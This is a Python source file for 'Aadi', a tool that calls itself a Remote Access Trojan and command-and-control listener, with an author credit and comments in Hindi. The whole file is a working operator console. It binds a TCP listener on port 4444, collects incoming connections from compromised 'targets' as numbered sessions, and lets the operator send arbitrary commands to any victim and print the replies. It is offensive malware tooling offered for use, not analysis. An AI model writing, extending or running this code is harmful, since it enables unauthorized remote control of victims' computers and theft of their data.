"""
Aadi — Remote Access Trojan (RAT) & C2 Session Handler Module
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import socket
import threading
import time
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table

console = Console()

# एक्टिव सेशन्स को स्टोर करने के लिए डिक्शनरी
active_sessions = {}
session_counter = 1


def handle_client_connection(client_socket, address, session_id):
    """
    Manages an individual client connection in a separate thread.
    """
    global active_sessions
    active_sessions[session_id] = {
        "socket": client_socket,
        "address": address
    }
    console.print(
        f"\n[bold green][+] RAT Connection Received! Session ID: [{session_id}] from {address[0]}:{address[1]}[/]")


def start_listener():
    """
    Starts the TCP socket listener to accept incoming RAT/payload connections.
    """
    global session_counter
    console.rule("[bold magenta]🌐 AADI RAT & C2 Listener Console[/]")

    host = Prompt.ask("[cyan]Enter Listener Host/IP[/]", default="0.0.0.0")
    port = int(Prompt.ask("[cyan]Enter Listener Port[/]", default="4444"))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((host, port))
        server.listen(5)
        console.print(f"[bold green]✓ RAT Listener successfully bound to {host}:{port}[/]")
        console.print("[dim]Waiting for incoming target connections... (Press Ctrl+C to stop)[/]\n")

        def accept_connections():
            global session_counter
            while True:
                try:
                    client_sock, addr = server.accept()
                    sid = session_counter
                    session_counter += 1

                    # हर नए कनेक्शन के लिए एक नया थ्रेड शुरू करें
                    client_thread = threading.Thread(target=handle_client_connection, args=(client_sock, addr, sid))
                    client_thread.daemon = True
                    client_thread.start()
                except:
                    break

        # बैकग्राउंड में कनेक्शन सुनने के लिए थ्रेड चालू करें
        listener_thread = threading.Thread(target=accept_connections)
        listener_thread.daemon = True
        listener_thread.start()

        # इंटरैक्टिव सेशन लूप
        while True:
            cmd = Prompt.ask("\n[bold cyan]AADI-RAT>[/]").strip()

            if cmd == "sessions":
                if not active_sessions:
                    console.print("[yellow][-] No active RAT sessions found.[/]")
                else:
                    table = Table(title="Active RAT Sessions")
                    table.add_column("Session ID", style="cyan")
                    table.add_column("Target IP", style="green")
                    table.add_column("Port", style="magenta")

                    for sid, data in active_sessions.items():
                        table.add_row(str(sid), str(data["address"][0]), str(data["address"][1]))
                    console.print(table)

            elif cmd.startswith("interact"):
                parts = cmd.split()
                if len(parts) < 2:
                    console.print("[red]Usage: interact <session_id>[/]")
                    continue
                try:
                    sid = int(parts[1])
                    if sid in active_sessions:
                        target_sock = active_sessions[sid]["socket"]
                        console.print(
                            f"[bold green][*] Interacting with Session {sid}. Type 'back' to exit session.[/]")
                        while True:
                            r_cmd = Prompt.ask(f"[bold red]RAT(Session {sid})>[/]")
                            if r_cmd == "back":
                                break
                            if not r_cmd:
                                continue

                            target_sock.send(r_cmd.encode('utf-8'))
                            # रिस्पांस प्राप्त करना
                            response = target_sock.recv(4096).decode('utf-8', errors='ignore')
                            console.print(response)
                    else:
                        console.print(f"[red]Invalid Session ID: {sid}[/]")
                except ValueError:
                    console.print("[red]Please provide a valid numeric session ID.[/]")

            elif cmd == "help":
                console.print("[cyan]Available RAT Commands:[/]")
                console.print("  [green]sessions[/]  - List all active remote sessions")
                console.print("  [green]interact <id>[/] - Interact with a specific session")
                console.print("  [green]back/exit[/] - Return to main AADI menu")
            elif cmd in ["exit", "back"]:
                break
            else:
                console.print("[red]Unknown command. Type 'help' for available commands.[/]")

    except Exception as e:
        console.print(f"[bold red]✗ RAT Listener Error: {e}[/]")
    finally:
        server.close()